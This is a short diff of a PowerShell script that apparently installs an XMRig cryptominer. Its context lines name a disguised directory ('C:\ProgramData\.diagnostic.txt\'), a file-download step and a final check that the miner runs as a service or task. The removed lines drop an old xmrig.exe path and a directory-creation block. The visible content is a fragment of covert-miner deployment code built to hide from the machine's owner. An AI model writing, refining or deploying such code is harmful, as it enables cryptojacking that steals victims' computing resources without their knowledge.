@@ -4,20 +4,6 @@ Write-Host "Current user: $currentUserName"
 
 # Define target directory - fixed the path (removed .txt)
 $targetDir = "C:\ProgramData\.diagnostic.txt\"
-$oldMinerPath = "C:\Users\$currentUserName\xmrig.exe"
-
-
-# Step 2: Create target directory
-Write-Host "`nStep 2: Creating target directory..."
-try {
-    if (-not (Test-Path $targetDir)) {
-        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
-    }
-    Write-Host "  Target directory: $targetDir"
-} catch {
-    Write-Host "  Failed to create directory: $($_.Exception.Message)" -ForegroundColor Red
-    Exit 1
-}
 
 # Step 3: Download files directly to target directory
 Write-Host "`nStep 3: Downloading files..."
@@ -267,6 +253,7 @@ Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gr
 # } catch {
 #     Write-Host "Could not remove script file." -ForegroundColor Yellow
 # }
+
 
 
 
